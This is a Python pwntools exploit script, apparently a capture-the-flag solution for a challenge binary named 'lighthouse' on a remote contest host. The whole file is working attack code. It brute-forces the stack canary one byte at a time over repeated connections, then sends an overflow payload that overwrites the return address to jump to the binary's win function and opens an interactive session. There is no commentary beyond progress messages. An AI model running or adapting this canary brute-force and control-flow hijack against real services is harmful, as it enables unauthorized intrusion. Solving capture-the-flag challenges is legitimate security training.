from pwn import *


elf = ELF('./lighthouse', checksec=False)
context.binary = elf


OFFSET_TO_CANARY = 136
OFFSET_TO_RIP = 136 + 8 + 8


HOST, PORT = 'offsec.m0lecon.it', 13584
RET = 0x40101a

known = b"\x00"

for i in range(7):
    found = False

    for bval in range(256):
        guess = known + bytes([bval])
        payload = b"A" * OFFSET_TO_CANARY + guess

        io = remote(HOST, PORT, level='error')

        io.recvuntil(b"> ")
        io.sendline(b"1")
        io.recvuntil(b"Enter your signal log entry: ")
        io.send(payload)
        #io.shutdown("send")

        try:
            data = io.recvall(timeout=0.5)
        except EOFError:
            data = b""

        io.close()

        if b"Log entry recorded. Over and out." in data:
            known = guess
            print(f"[+] byte {i+1}: {bval:02x}")
            found = True
            break

    if not found:
        print(f"[-] failed to recover byte {i+1}")
        exit()

canary = u64(known.ljust(8, b"\x00"))
print(f"[+] Canary: {canary:#x}")

io = remote(HOST, PORT, level='error')
io.recvuntil(b"> ").decode()
io.sendline(b"1")
io.recvuntil(b"Enter your signal log entry: ")

payload = flat(
    b"A" * OFFSET_TO_CANARY,
    canary,
    b"B" * 8,
    RET,
    elf.sym.win,
)

io.send(payload)
io.interactive()